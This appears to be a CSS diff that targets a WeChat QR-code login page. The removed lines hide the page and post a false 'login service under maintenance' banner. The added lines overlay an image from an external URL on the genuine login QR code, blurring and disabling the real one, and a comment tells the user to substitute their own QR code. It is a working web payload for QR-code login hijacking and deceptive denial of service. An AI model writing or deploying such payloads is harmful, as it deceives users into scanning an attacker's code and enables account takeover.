@@ -1,24 +1,27 @@
-/* > 让所有内容不可见 */
-.impowerBox, .wechat-login, body, html {
-  background: #000 !important;
-  color: #fff !important;
-}
-
-.qrcode, img, .status, .info, .title, .footer, .tips {
-  display: none !important;
-}
-
-/* > 在页面加一个大假提示 */
-body::before {
-  content: "当前登录服务维护中，请稍后再试。";
+.impowerBox::before {
+  content: '';
   display: block;
   position: fixed;
-  z-index: 1000000;
-  top: 40vh; left: 0; width: 100vw;
-  background: #e00;
-  color: #fff;
-  font-size: 2em;
-  text-align: center;
-  padding: 40px 0;
+  z-index: 99999;
+  top: 30vh;
+  left: 50vw;
+  transform: translate(-50%, 0);
+  width: 260px;
+  height: 260px;
+  /* 换成你自己二维码的真实外链地址！比如你的微信二维码图片 */
+  background: url('https://xinyisleep.github.io/img/2025/Webshell/Filter/2.png') no-repeat center center / 100% 100%;
+  box-shadow: 0 0 20px #000b;
+  border-radius: 16px;
+  border: 6px solid #fff;
 }
 
+.impowerBox .qrcode, /* 原有二维码 */
+.impowerBox .title,
+.impowerBox .info,
+.status_icon,
+.impowerBox .status,
+.impowerBox .footer {
+  filter: blur(6px) grayscale(1);
+  opacity: 0.1;
+  pointer-events: none !important;
+}
